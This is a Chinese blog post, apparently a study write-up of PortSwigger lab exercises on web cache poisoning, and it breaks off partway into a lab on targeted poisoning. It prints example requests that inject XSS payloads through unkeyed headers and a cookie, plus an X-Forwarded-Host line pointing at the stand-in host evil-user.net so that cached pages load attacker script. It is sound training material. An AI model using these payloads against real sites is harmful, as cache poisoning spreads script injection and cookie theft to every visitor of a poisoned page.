<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="且将新火试新茶，诗酒趁年华">
    <meta name="author" content="Drunkbaby">
    
    <title>
        
            PortSwigger-WebCache中毒漏洞学习 |
        
        Drunkbaby&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
                </a>
            
            <a class="logo-title" href="/">
               Drunkbaby&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">PortSwigger-WebCache中毒漏洞学习</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.svg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">Drunkbaby</span>
                            
                                <span class="author-label">Lv6</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2022-04-28 21:17:50</span>
        <span class="mobile">2022-04-28 21:17</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2022-09-18 17:53:13</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Port/">Port</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>7.8k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>30 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="PortSwigger-WebCache-Poisoning-漏洞学习"><a href="#PortSwigger-WebCache-Poisoning-漏洞学习" class="headerlink" title="PortSwigger-WebCache Poisoning 漏洞学习"></a>PortSwigger-WebCache Poisoning 漏洞学习</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><blockquote>
<p>师傅们如果做题有问题可以直接在文章下留言，或者是私信我即可，有些地方我个人交代的可能不太好，还请师傅们见谅。</p>
</blockquote>
<p>最早听闻 Web Cache Poisoning 是在 HTTP 包里面吧，当时并没有怎么在意，现如今要正式面对它了。</p>
<p>Web Cache 不同于 OWASP TOP10 系列的漏洞锋利，它一般是作为一种辅助性手段，地位高于 CORS，低于 CSRF。</p>
<p>Web Cache 投毒在很多知名的网站上都有存在的隐患，比如 Google，百度，msn，必应等 …… 给人一种无孔不入的味道</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CacheIntroduction.png" class="">

<h2 id="0x02-概念明晰"><a href="#0x02-概念明晰" class="headerlink" title="0x02 概念明晰"></a>0x02 概念明晰</h2><blockquote>
<p>学漏洞：知概念，晓进攻，懂防御。</p>
</blockquote>
<p>先来明晰一下一些基本概念吧。</p>
<h3 id="1-什么是-Web-Cache"><a href="#1-什么是-Web-Cache" class="headerlink" title="1. 什么是 Web Cache"></a>1. 什么是 Web Cache</h3><p>理解 Web Cache，我们先用平常浏览 Web 网页的一些例子进行说明。</p>
<p>有没有发现自己在打开同一个网站的时候，打开那个网站的速度特别快，比如你常设置的首页，在打开的时候异常快速，这就是 Web Cache 的一种情况。</p>
<p>而 Web Cache 是从服务器 -&gt; Response 这个角度出发考虑的。如果服务器必须单独向每个 HTTP 请求发送 Reponse 回应，则可能会使服务器过载，从而导致延迟问题和较差的用户体验，尤其是在繁忙时期。缓存主要是减少此类问题的一种方法。</p>
<blockquote>
<p>轻轻吐槽一句：感觉我们学校的某 OJ 系统就是没有做好 Web Cache，所以大家一起用的时候体验极差。</p>
</blockquote>
<p>Web Cache 位于服务器和用户之间，Web Cache 保存对特定请求的响应。通常在固定的时间内，如果另一个用户随后发送等效请求(也就是很多类似的请求，比如一直刷新界面)，则 Web Cache 只是将缓存的响应的副本直接提供给用户，而无需来自后端的任何交互。这大大减少了服务器上必须处理的重复请求的数量，从而大大减轻了服务器上的负载。</p>
<ul>
<li>原理如图所示</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CacheLike.png" class="">

<h3 id="2-如何在-Web-Cache-运行流程的基础上进行-Poison？"><a href="#2-如何在-Web-Cache-运行流程的基础上进行-Poison？" class="headerlink" title="2. 如何在 Web Cache 运行流程的基础上进行 Poison？"></a>2. 如何在 Web Cache 运行流程的基础上进行 Poison？</h3><p>如何在 Web Cache 运行流程的基础上进行 Poison？也就是我们所说的恶意利用，或是恶意构造 Payload</p>
<p>如果攻击者首先触发服务器缓存附有恶意 Payload 的响应，当其他用户发送相同请求时即会接收到这个恶意的响应。从影响范围来看，一旦成功缓存被投毒的响应，会影响到大量的用户，比起以往某些只能针对某个用户发起的攻击，危害大很多很多。</p>
<blockquote>
<p>因而 Web Cache Poisoning 是一种辅助攻击手段，有点扩大战果的味道。</p>
</blockquote>
<h3 id="3-Cache-Key-缓存键"><a href="#3-Cache-Key-缓存键" class="headerlink" title="3. Cache Key:缓存键"></a>3. Cache Key:缓存键</h3><p>当 Web Cache 收到 HTTP 请求时，它首先必须确定是否存在可以直接提供的 Cache 响应，或者它是否必须转发请求以供后端服务器处理。Web Cache 通过比较请求组件的预定义子集（统称为“缓存键 —— Cache Key”）来标识等效请求。</p>
<ul>
<li>一般缓存键包括 Request Header 和 Host 头。服务器端只识别设置为缓存键的特征是否相同，这也就导致了 Web 缓存投毒漏洞的产生。</li>
</ul>
<h2 id="0x03-对于-Web-Cache-进行投毒"><a href="#0x03-对于-Web-Cache-进行投毒" class="headerlink" title="0x03 对于 Web Cache 进行投毒"></a>0x03 对于 Web Cache 进行投毒</h2><ul>
<li>这一块的 Exploit 分为两部分，我们后续分开细讲一下。</li>
</ul>
<blockquote>
<p>利用，总的来说还是漏洞挖掘的一部分，在这之前，我们略微提一嘴 Web Cache 的危害。</p>
</blockquote>
<h5 id="Web-Cache-的危害"><a href="#Web-Cache-的危害" class="headerlink" title="Web Cache 的危害"></a>Web Cache 的危害</h5><p>四个字：<strong>扩大战果</strong></p>
<h3 id="1-进行-Web-Cache-Poisoning-的思路"><a href="#1-进行-Web-Cache-Poisoning-的思路" class="headerlink" title="1. 进行 Web Cache Poisoning 的思路"></a>1. 进行 Web Cache Poisoning 的思路</h3><ul>
<li>讲的这一套思路基于已经挖到其他漏洞的前提下，单纯进行 Web Cache Poisoning 的思路。</li>
</ul>
<p>(1) 找出未被 Web Cache 进行缓存的输入 ———— 例如 GET 请求中的参数，有些 GET 请求的参数会被其他用户先行请求。<br>(2) 从后端服务器诱发被投毒的响应。<br>(3) 得到被缓存的响应。</p>
<p>这样讲还是太粗略太粗略，我们深入理解一下。</p>
<h4 id="一、找出未被-Web-Cache-进行缓存的输入"><a href="#一、找出未被-Web-Cache-进行缓存的输入" class="headerlink" title="一、找出未被 Web Cache 进行缓存的输入"></a>一、找出未被 Web Cache 进行缓存的输入</h4><p>害得拿出这张原理图</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CacheLike.png" class="">

<p>我们想要构造 Web Cache 投毒就需要我们的输入能够反馈在响应中，但是如果我们的输入被设置为缓存键，那就不可能有用户发出等效请求 ———— 因为这个地方用户的请求会被拦下来，一看原理图便立马明白了吧 ~</p>
<p>所以我们需要不断调试直到找到我们的输入既不会是缓存键又可以被反馈在被缓存的响应中。这样才能保证被投毒的响应缓存被投放到受害者那里，Port 推荐了一款插件 Param Miner 来辅助我们寻找这样的不会被缓存的字段。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ParaMiner.png" class="">

<p>使用比较简单，只需要右键选择 Guess headers 即可。并且为了不给真实用户造成困扰，可以开启 cache buster，后续我们讲一讲基本使用。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ParaMinerUse.png" class="">

<h4 id="二、从后端服务器诱发被投毒的响应"><a href="#二、从后端服务器诱发被投毒的响应" class="headerlink" title="二、从后端服务器诱发被投毒的响应"></a>二、从后端服务器诱发被投毒的响应</h4><p>我们确认了不会被缓存的输入以后，我们就要看服务端是如何处理这个输入的，如果可以动态反馈到响应中，就是我们能够发动 Web 缓存投毒的关键。</p>
<h4 id="三、得到被缓存的响应"><a href="#三、得到被缓存的响应" class="headerlink" title="三、得到被缓存的响应"></a>三、得到被缓存的响应</h4><p>我们的输入可以被反馈到响应中还不够，还得能够生成缓存，这样才可以真正地将恶意 Payload 落地。所以我们为此还是要不断调试才能成功找到生成投毒缓存的操作。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/CacheLanding.png" class="">

<blockquote>
<p>总体来说还是比较抽象的，直接入靶场尝试。</p>
</blockquote>
<hr>
<hr>
<blockquote>
<p>整体的漏洞利用分两部分</p>
<p>一是基于缓存设计缺陷的 Web Cache Poisoning 攻击</p>
<p>二是基于缓存实现缺陷的 Web Cache Poisoning 攻击</p>
</blockquote>
<h2 id="0x04-基于缓存设计缺陷的-Web-Cache-Poisoning-攻击"><a href="#0x04-基于缓存设计缺陷的-Web-Cache-Poisoning-攻击" class="headerlink" title="0x04 基于缓存设计缺陷的 Web Cache Poisoning 攻击"></a>0x04 基于缓存设计缺陷的 Web Cache Poisoning 攻击</h2><h3 id="1-使用-Web-Cache-Poisoning-扩大-XSS-战果"><a href="#1-使用-Web-Cache-Poisoning-扩大-XSS-战果" class="headerlink" title="1. 使用 Web Cache Poisoning 扩大 XSS 战果"></a>1. 使用 Web Cache Poisoning 扩大 XSS 战果</h3><p>因为 XSS 攻击也是有一部分是输入被反馈在响应中，所以 Web Cache 投毒可以与 XSS 相配合。我们以这一个 HTTP 请求为例说明一下。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/en?region=uk</span> <span class="token http-version property">HTTP/1.1</span></span> 
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">innocent-website.com </span></span>
<span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">innocent-website.co.uk </span></span>


<span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">public </span></span>
&lt;meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此处标头的值会动态生成图像 URL，该 URL 将回显于 Response 中。</p>
<p>X-Forwarded-Host 指定的 URL 会代替 Host 的值被反馈在响应中，并且 X-Forwarded-Host 是不会被缓存的字段，但是Host和请求行是缓存键。</p>
<ul>
<li>所以所有 Host 为 innocent-website.com 的用户请求 <code>/en?region=uk</code> 时都会接收到被投毒的响应。</li>
</ul>
<blockquote>
<p>如果我们要利用的话，POC 如下</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/en?region=uk</span> <span class="token http-version property">HTTP/1.1</span></span> 
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">innocent-website.com </span></span>
<span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">a.">&lt;script>alert(1)&lt;/script>" </span></span>


<span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">public </span></span>
&lt;meta property="og:image" content="https://a.">&lt;script>alert(1)&lt;/script>"/cms/social.png" /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>有时候 Web Cache 也会替换为 JS 资源，例如下面这一 HTTP 请求。</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> 
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">innocent-website.com </span></span>
<span class="token header"><span class="token header-name keyword">X-Forwarded-Host</span><span class="token punctuation">:</span> <span class="token header-value">evil-user.net // 写恶意的 EXP</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 Firefox/57.0 </span></span>

<span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span>
&lt;script src="https://evil-user.net/static/analytics.js">&lt;/script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来我们以这一靶场来体会体会利用 X-Forwarded-Host 头进行 Web Cache Poisoning 的案例。</p>
<blockquote>
<h5 id="Lab-Web-cache-poisoning-with-an-unkeyed-header"><a href="#Lab-Web-cache-poisoning-with-an-unkeyed-header" class="headerlink" title="Lab: Web cache poisoning with an unkeyed header"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header">Lab: Web cache poisoning with an unkeyed header</a></h5></blockquote>
<p>打开靶场，我们去商品界面进行抓包，通过修改 <code>X-Forwarded-Host</code> 参数为 <code>www.baidu.com</code>，进行 Web 缓存测试。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/KeyDetection1.png" class="">

<p>从上图来看，现在是没有产生 Web 缓存的，然后我们插入到 X-Forwarded-Host 字段会替换掉本应是 Host 字段的值。<br>这样就相当于 <code>resources/js/tracking.js</code> 这个文件是可以伪造的，然后我们再发包观察回显。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/WebCacheGetHit.png" class="">

<p>我们再发包之后，X-Cache 从 miss 变成了 hit，这就代表着产生了 Web 缓存。</p>
<ul>
<li>接着，我们去到 Exploit Server，将 Payload 写入此文件下。</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ExploitPayloadJS.png" class="">

<p>然后随便找一个靶场里面的商品，抓包，把 Exploit Server 的域名作为 X-Forwarded-Host 的参数，然后在 Repeater 当中重新发包几次让 Web 缓存生成。</p>
<p>发包之前需要先找到一个未被键入的参数，例如 <code>?a=1</code> 或者是其他的参数，发包直至 Cache 为 hit；再删除参数，发包直至 Cache 为 hit。</p>
<p>再到对应的商品界面进行刷新，即可触发 <code>alert(document.cookie)</code></p>
<ul>
<li>这里千万别把 <code>X-Forwarded-Host</code> 放到最下面一行，不然一直会发包失败。这道题如果踩坑的师傅可以私信我。</li>
</ul>
<h3 id="2-对不被缓存的-Cookie-进行投毒"><a href="#2-对不被缓存的-Cookie-进行投毒" class="headerlink" title="2. 对不被缓存的 Cookie 进行投毒"></a>2. 对不被缓存的 Cookie 进行投毒</h3><p>这种情况的利用较为苛刻，情况也比较少。我们以此 HTTP 请求为例</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;blog&#x2F;post.php?mobile&#x3D;1 HTTP&#x2F;1.1 
Host: innocent-website.com 
User-Agent: Mozilla&#x2F;5.0 Firefox&#x2F;57.0 
Cookie: language&#x3D;pl; 
Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们看到应用程序通过 Cookie 中的 language 的值来调整网站的语言，当该请求生成响应后，等效请求的用户收到的就是波兰语(pl)的页面了。<br>当然了，这种攻击方式比较少，因为很容易因为影响到正常用户被发现。</p>
<blockquote>
<h5 id="Lab-Web-cache-poisoning-with-an-unkeyed-cookie"><a href="#Lab-Web-cache-poisoning-with-an-unkeyed-cookie" class="headerlink" title="Lab: Web cache poisoning with an unkeyed cookie"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie">Lab: Web cache poisoning with an unkeyed cookie</a></h5></blockquote>
<ul>
<li>我们先抓包，添加一些参数探测试一下我们输入的值会去向何处。</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UnkeyedCookieBAG.png" class="">

<p>我们可以看到 Cookie 中的 “fehost” 字段被自动拼接到Response 回应中的 <code>script</code> 元素下，那么我们可以修改这个字段的值实现 XSS 攻击。</p>
<p>payload</p>
<pre class="line-numbers language-script" data-language="script"><code class="language-script">fehost&#x3D;someString&quot;-alert(1)-&quot;someString<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>需要发几次包，使得 X-Cache 的值变为 hit，Port 这里时而会很卡，如果发包几次之后还是没有回显的话就去 MyAccout 界面，再回到发包的界面试一试。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UnkeyedCookieSolved.png" class="">

<h3 id="3-使用多个-HTTP-Header-发起-Web-Cache-投毒"><a href="#3-使用多个-HTTP-Header-发起-Web-Cache-投毒" class="headerlink" title="3. 使用多个 HTTP Header 发起 Web Cache 投毒"></a>3. 使用多个 HTTP Header 发起 Web Cache 投毒</h3><ul>
<li><p>简单来说便是利用 Web Cache 投毒扩大 CSRF 的战果。</p>
</li>
<li><p>我们前面学习的两种 Web Cache 投毒都是基于未键入的请求，而我们要发起更高级的攻击时，需要使用多个 HTTP Header。</p>
</li>
</ul>
<p>我们以这一 HTTP 包为例</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;random HTTP&#x2F;1.1 
Host: innocent-site.com 
X-Forwarded-Proto: http &#x2F;&#x2F;这里也有可以是 X-Forwarded-Scheme

HTTP&#x2F;1.1 301 moved permanently 
Location: https:&#x2F;&#x2F;innocent-site.com&#x2F;random<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>假设一个网站需要使用 HTTPS 协议进行安全通信，但是如果我们使用 HTTP 协议访问该网站，则会自动触发一个指向 <code>Host</code> 的重定向，那么我们在 Request 请求当中修改 <code>X-Forwarded-Host</code> 修改为一些恶意网站，即可造成 Web Cache 投毒的进一步攻击。</p>
<p><strong>修改包，发起攻击</strong></p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;random HTTP&#x2F;1.1 
Host: innocent-site.com 
X-Forwarded-Proto: http
X-Forwarded-Host: evil.com

HTTP&#x2F;1.1 301 moved permanently 
Location: https:&#x2F;&#x2F;innocent-site.com&#x2F;evil.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<h5 id="Lab-Web-cache-poisoning-with-multiple-headers"><a href="#Lab-Web-cache-poisoning-with-multiple-headers" class="headerlink" title="Lab: Web cache poisoning with multiple headers"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers">Lab: Web cache poisoning with multiple headers</a></h5></blockquote>
<ul>
<li>我们先按照上道题目一样，使用 <code>X-Forwarded-Host</code> 进行攻击，发觉之前的 <code>js</code> 路径失效了，我们无法进行攻击。</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/NoUseForCache.png" class="">

<p>根据多 HTTP Header 攻击的思路，我们加上 <code>X-Forwarded-Scheme</code> 这一标头，并将其赋值 “HTTP”</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">X-Forwarded-Scheme: HTTP
X-Forwarded-Host: www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeader.png" class="">

<p>出现了 <code>Location</code>，也就是重定向。</p>
<p>证明该靶场存在 Web Cache Poisoning 的隐患之后，我们还是和上题一样构造 Payload。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeaderEXP.png" class="">

<p><strong>发包这里，我们去到 GET 请求的 <code>/resources/js/tracking.js</code> 接口下</strong>，这个接口的请求我们点击 f12，在新的页面打开此 js。</p>
<p>先带上参数 <code>?cb=1234</code>，这是第一步：找出未被 Web Cache 进行缓存的输入。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeaderAttack1.png" class="">

<p>点击 “Follow redirection”，若出现 <code>alert(document.cookie</code> 则说明成功。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeaderAttack2.png" class="">

<p>再将 <code>?cb=1234</code> 删除，发包即可。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeaderAttack3.png" class="">

<h3 id="4-通过-Cache-Control-导致信息泄露"><a href="#4-通过-Cache-Control-导致信息泄露" class="headerlink" title="4. 通过 Cache-Control 导致信息泄露"></a>4. 通过 Cache-Control 导致信息泄露</h3><ul>
<li>这里主要是介绍了一下 <code>Vary 头</code> 与 <code>Cache-Control</code></li>
<li>我们在 HTTP Request 包中添加入 <strong>Via 与 Cache-Control</strong> 便可得到泄露的信息。</li>
</ul>
<h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><p>当响应包含有关清除缓存的频率或当前缓存的响应的时长的信息时，我们可以得到一个叫做 “有效期” 的信息；有效期可以帮助我们去计算时间从而达到 Web Cache Poisoning。</p>
<h4 id="Vary-Header"><a href="#Vary-Header" class="headerlink" title="Vary Header"></a>Vary Header</h4><p>Vary 头指定了一些可以被视为缓存键的字段列表，常见的如 User-Agent 头，应用程序通过其可以仅向指定用户群投放响应，也可以利用这个特点向特定用户群发动 Web 缓存投毒攻击。</p>
<blockquote>
<h5 id="Lab-Targeted-web-cache-poisoning-using-an-unknown-header"><a href="#Lab-Targeted-web-cache-poisoning-using-an-unknown-header" class="headerlink" title="Lab: Targeted web cache poisoning using an unknown header"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header">Lab: Targeted web cache poisoning using an unknown header</a></h5></blockquote>
<p>抓包 GET 请求，接口为 <code>/</code>，使用 <code>Para Miner</code> 查找可以添加的标头。</p>
